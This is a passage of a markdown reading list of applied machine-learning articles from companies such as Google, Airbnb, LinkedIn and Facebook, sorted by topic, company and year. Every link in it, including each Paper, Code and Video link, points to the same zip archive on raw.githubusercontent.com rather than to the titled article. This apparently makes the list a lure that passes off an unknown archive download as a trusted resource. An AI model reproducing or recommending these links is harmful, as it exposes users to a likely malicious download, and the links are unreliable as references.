57. [SearchSage: Learning Search Query Representations at Pinterest](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2021`
58. [Query2Prod2Vec: Grounded Word Embeddings for eCommerce](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Coveo` `2021`
59. [3 Changes to Expand DoorDash’s Product Search Beyond Delivery](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2022`
60. [Learning To Rank Diversely](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2022`
61. [How to Optimise Rankings with Cascade Bandits](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Expedia` `2022`
62. [A Guide to Google Search Ranking Systems](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2022` 
63. [Deep Learning for Search Ranking at Etsy](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Etsy` `2022`
64. [Search at Calm](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Calm` `2022`

## Embeddings
1. [Vector Representation Of Items, Customer And Cart To Build A Recommendation System](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Sears` `2017`
2. [Billion-scale Commodity Embedding for E-commerce Recommendation in Alibaba](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2018`
3. [Embeddings@Twitter](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Twitter` `2018`
4. [Listing Embeddings in Search Ranking](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Airbnb` `2018`
5. [Understanding Latent Style](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stitch Fix` `2018`
6. [Towards Deep and Representation Learning for Talent Search at LinkedIn](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2018`
7. [Personalized Store Feed with Vector Embeddings](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2018`
8. [Should we Embed? A Study on Performance of Embeddings for Real-Time Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Moshbit` `2019`
9. [Machine Learning for a Better Developer Experience](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2020`
10. [Announcing ScaNN: Efficient Vector Similarity Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
11. [BERT Goes Shopping: Comparing Distributional Models for Product Representations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Coveo` `2021`
12. [The Embeddings That Came in From the Cold: Improving Vectors for New and Rare Products with Content-Based Inference](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Coveo` `2022`
13. [Embedding-based Retrieval at Scribd](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Scribd` `2021`
14. [Multi-objective Hyper-parameter Optimization of Behavioral Song Embeddings](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Apple` `2022`
15. [Embeddings at Spotify's Scale - How Hard Could It Be?](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Spotify` `2023`

## Natural Language Processing
1. [Abusive Language Detection in Online User Content](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Yahoo` `2016`
2. [Smart Reply: Automated Response Suggestion for Email](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2016` 
3. [Building Smart Replies for Member Messages](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2017`
4. [How Natural Language Processing Helps LinkedIn Members Get Support Easily](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2019`
5. [Gmail Smart Compose: Real-Time Assisted Writing](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2019`
6. [Goal-Oriented End-to-End Conversational Models with Profile Features in a Real-World Setting](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2019`
7. [Give Me Jeans not Shoes: How BERT Helps Us Deliver What Clients Want](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stitch Fix` `2019`
8. [DeText: A deep NLP Framework for Intelligent Text Understanding](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2020`
9. [SmartReply for YouTube Creators](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2020`
10. [Using Neural Networks to Find Answers in Tables](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
11. [A Scalable Approach to Reducing Gender Bias in Google Translate](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2020`
12. [Assistive AI Makes Replying Easier](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Microsoft` `2020`
13. [AI Advances to Better Detect Hate Speech](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2020`
14. [A State-of-the-Art Open Source Chatbot](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2020`
15. [A Highly Efficient, Real-Time Text-to-Speech System Deployed on CPUs](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2020`
16. [Deep Learning to Translate Between Programming Languages](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2020`
17. [Deploying Lifelong Open-Domain Dialogue Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2020`
18. [Introducing Dynabench: Rethinking the way we benchmark AI](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2020`
19. [How Gojek Uses NLP to Name Pickup Locations at Scale](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Gojek` `2020`
20. [The State-of-the-art Open-Domain Chatbot in Chinese and English](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Baidu` `2020`
21. [PEGASUS: A State-of-the-Art Model for Abstractive Text Summarization](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
22. [Photon: A Robust Cross-Domain Text-to-SQL System](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) ([Demo](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Salesforce`	`2020`
23. [GeDi: A Powerful New Method for Controlling Language Models](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Salesforce` `2020`
24. [Applying Topic Modeling to Improve Call Center Operations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `RICOH` `2020`
25. [WIDeText: A Multimodal Deep Learning Framework](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2020`
26. [Dynaboard: Moving Beyond Accuracy to Holistic Model Evaluation in NLP](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook`  `2021`
27. [How we reduced our text similarity runtime by 99.96%](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Microsoft` `2021`
28. [Textless NLP: Generating expressive speech from raw audio](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [(Part 1)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [(Part 2)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [(Part 3)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [(Code and Pretrained Models)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2021`
29. [Grammar Correction as You Type, on Pixel 6](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2021`
30. [Auto-generated Summaries in Google Docs](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2022`
31. [ML-Enhanced Code Completion Improves Developer Productivity](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2022`
32. [Words All the Way Down — Conversational Sentiment Analysis](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `PayPal` `2022`

## Sequence Modelling
1. [Doctor AI: Predicting Clinical Events via Recurrent Neural Networks](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Sutter Health` `2015`
2. [Deep Learning for Understanding Consumer Histories](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Zalando` `2016`
3. [Using Recurrent Neural Network Models for Early Detection of Heart Failure Onset](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Sutter Health` `2016`
4. [Continual Prediction of Notification Attendance with Classical and Deep Networks](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Telefonica` `2017` 
5. [Deep Learning for Electronic Health Records](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2018`
6. [Practice on Long Sequential User Behavior Modeling for Click-Through Rate Prediction](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip))`Alibaba` `2019`
7. [Search-based User Interest Modeling with Sequential Behavior Data for CTR Prediction](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2020`
8. [How Duolingo uses AI in every part of its app](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Duolingo` `2020`
9. [Leveraging Online Social Interactions For Enhancing Integrity at Facebook](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2020`
10. [Using deep learning to detect abusive sequences of member activity](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2021`

## Computer Vision
1. [Creating a Modern OCR Pipeline Using Computer Vision and Deep Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Dropbox` `2017`
2. [Categorizing Listing Photos at Airbnb](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2018`
3. [Amenity Detection and Beyond — New Frontiers of Computer Vision at Airbnb](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2019`
4. [How we Improved Computer Vision Metrics by More Than 5% Only by Cleaning Labelling Errors](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Deepomatic`
5. [Making machines recognize and transcribe conversations in meetings using audio and video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Microsoft` `2019`
6. [Powered by AI: Advancing product understanding and building new shopping experiences](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2020`
7. [A Neural Weather Model for Eight-Hour Precipitation Forecasting](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
8. [Machine Learning-based Damage Assessment for Disaster Relief](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
9. [RepNet: Counting Repetitions in Videos](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
10. [Converting Text to Images for Product Discovery](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2020`
11. [How Disney Uses PyTorch for Animated Character Recognition](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Disney` `2020`
12. [Image Captioning as an Assistive Technology](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip~https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `IBM` `2020`
13. [AI for AG: Production machine learning for agriculture](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Blue River` `2020`
14. [AI for Full-Self Driving at Tesla](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Tesla` `2020`
15. [On-device Supermarket Product Recognition](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2020`
16. [Using Machine Learning to Detect Deficient Coverage in Colonoscopy Screenings](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
17. [Shop The Look: Building a Large Scale Visual Shopping System at Pinterest](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Pinterest` `2020`
18. [Developing Real-Time, Automatic Sign Language Detection for Video Conferencing](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
19. [Vision-based Price Suggestion for Online Second-hand Items](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2020`
20. [New AI Research to Help Predict COVID-19 Resource Needs From X-rays](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Model](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2021`
21. [An Efficient Training Approach for Very Large Scale Face Recognition](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2021`
22. [Identifying Document Types at Scribd](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Scribd` `2021`
23. [Semi-Supervised Visual Representation Learning for Fashion Compatibility](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Walmart` `2021`
24. [Recognizing People in Photos Through Private On-Device Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Apple` `2021`
25. [DeepFusion: Lidar-Camera Deep Fusion for Multi-Modal 3D Object Detection](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2022`
26. [Contrastive language and vision learning of general fashion concepts](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip))`Coveo` `2022`
27. [Leveraging Computer Vision for Search Ranking](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `BazaarVoice` `2023`

## Reinforcement Learning
1. [Deep Reinforcement Learning for Sponsored Search Real-time Bidding](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2018`
2. [Budget Constrained Bidding by Model-free Reinforcement Learning in Display Advertising](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2018`
3. [Reinforcement Learning for On-Demand Logistics](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2018`
4. [Reinforcement Learning to Rank in E-Commerce Search Engine](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2018`
5. [Dynamic Pricing on E-commerce Platform with Deep Reinforcement Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2019`
6. [Productionizing Deep Reinforcement Learning with Spark and MLflow](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Zynga` `2020`
7. [Deep Reinforcement Learning in Production Part1](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [Part 2](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Zynga` `2020`
8. [Building AI Trading Systems](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Denny Britz` `2020`
9. [Shifting Consumption towards Diverse content via Reinforcement Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Spotify` `2022`
10. [Bandits for Online Calibration: An Application to Content Moderation on Social Media Platforms](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Meta` `2022`
11. [How to Optimise Rankings with Cascade Bandits](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Expedia` `2022`
12. [Selecting the Best Image for Each Merchant Using Exploration and Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2023`

## Anomaly Detection
1. [Detecting Performance Anomalies in External Firmware Deployments](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2019`
2. [Detecting and Preventing Abuse on LinkedIn using Isolation Forests](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2019`
3. [Deep Anomaly Detection with Spark and Tensorflow](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [(Hopsworks Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Swedbank`, `Hopsworks` `2019`
4. [Preventing Abuse Using Unsupervised Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
5. [The Technology Behind Fighting Harassment on LinkedIn](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
6. [Uncovering Insurance Fraud Conspiracy with Network Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Ant Financial` `2020`
7. [How Does Spam Protection Work on Stack Exchange?](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stack Exchange` `2020`
8. [Auto Content Moderation in C2C e-Commerce](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Mercari` `2020`
9. [Blocking Slack Invite Spam With Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Slack` `2020`
10. [Cloudflare Bot Management: Machine Learning and More](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Cloudflare` `2020`
11. [Anomalies in Oil Temperature Variations in a Tunnel Boring Machine](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `SENER` `2020`
12. [Using Anomaly Detection to Monitor Low-Risk Bank Customers](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Rabobank` `2020`
13. [Fighting fraud with Triplet Loss](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `OLX Group` `2020`
14. [Facebook is Now Using AI to Sort Content for Quicker Moderation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Alternative](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2020`
15. How AI is getting better at detecting hate speech [Part 1](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Part 2](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Part 3](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Part 4](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2020`
16. [Using deep learning to detect abusive sequences of member activity](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2021`
